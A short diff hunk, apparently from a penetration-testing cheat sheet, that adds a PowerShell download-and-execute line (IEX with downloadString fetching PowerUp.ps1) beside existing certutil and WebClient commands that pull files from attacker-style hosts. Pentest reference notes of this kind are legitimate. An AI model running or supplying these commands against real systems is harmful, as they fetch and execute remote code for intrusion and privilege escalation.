@@ -1926,6 +1926,8 @@ certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.ba
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"
 
 (New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
+
+powershell IEX (New-Object Net.WebClient).downloadString('https://192.168.49.221/PowerUp.ps1')
 ````
 
 ### Windows Download from FTP
